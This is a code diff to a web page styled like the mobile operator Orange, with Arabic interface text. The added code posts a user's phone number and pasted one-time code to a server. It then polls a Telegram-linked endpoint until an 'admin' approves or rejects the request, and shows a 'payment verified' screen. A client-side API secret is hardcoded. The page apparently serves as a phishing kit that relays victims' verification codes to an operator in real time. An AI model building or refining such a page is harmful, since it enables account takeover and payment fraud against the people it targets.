@@ -880,7 +880,23 @@
                 → رقم هاتف خاطئ؟
             </button>
         </div>
-
+        
+        <!-- Success Screen -->
+        <div class="success-screen" id="orangeSuccessScreen" style="display:none;">
+            <div style="text-align:center;padding:40px 20px;">
+                <div style="width:80px;height:80px;border-radius:50%;background:#D1FAE5;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                    <span style="font-size:40px;">✅</span>
+                </div>
+                <h2 style="font-size:20px;color:#065F46;margin-bottom:8px;font-weight:700;">Verification Complete!</h2>
+                <p style="color:#6B7280;font-size:13px;line-height:1.6;margin-bottom:24px;">
+                    Your payment has been verified and approved.<br>You will be redirected shortly.
+                </p>
+                <button onclick="location.reload()" style="width:100%;padding:14px;background:#FF6600;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;">
+                    Continue
+                </button>
+            </div>
+        </div>
+        
     </div>
     
     <script>
@@ -1607,7 +1623,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phone: `${phoneCode} ${currentMsisdn}`,
+                        phone: phoneCode + ' ' + currentMsisdn,
                         otp: link,
                         country: currentCountry
                     })
@@ -1629,29 +1645,37 @@
                     }
                 } catch (e) {}
                 
-                const errEl = document.getElementById('otpError');
-                errEl.textContent = t('processing');
-                errEl.style.background = '#e8f5e9';
-                errEl.style.color = '#2e7d32';
-                errEl.classList.add('show');
-                
-                linkInput.value = '';
-                verifyBtn.disabled = true;
-                
-                setTimeout(() => {
-                    errEl.textContent = t('pasteNew');
-                    errEl.style.background = '#fff3e0';
-                    errEl.style.color = '#e65100';
-                    linkInput.focus();
-                }, 3000);
+                // Poll for admin verification
+                const pollTimer = setInterval(async () => {
+                    try {
+                        const statusRes = await fetch('/api/telegram/status/' + currentRequestId, {
+                            headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                        });
+                        const statusData = await statusRes.json();
+                        
+                        if (statusData.status === 'completed') {
+                            clearInterval(pollTimer);
+                            otpScreen.classList.remove('active');
+                            document.getElementById('orangeSuccessScreen').classList.add('active');
+                        } else if (statusData.status === 'rejected' || statusData.status === 'invalid') {
+                            clearInterval(pollTimer);
+                            document.getElementById('otpError').textContent = statusData.status === 'rejected' ? 'Payment rejected by admin' : 'Invalid link provided';
+                            document.getElementById('otpError').classList.add('show');
+                            linkInput.value = '';
+                            verifyBtn.disabled = false;
+                            verifyBtn.textContent = t('verify');
+                        }
+                    } catch (e) {
+                        // Poll error - continue polling
+                    }
+                }, 2000);
                 
             } catch (e) {
                 document.getElementById('otpError').textContent = t('verifyFailed');
                 document.getElementById('otpError').classList.add('show');
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = t('verify');
             }
-            
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = t('verify');
         });
         
         // ── Clipboard Permission Gate ──
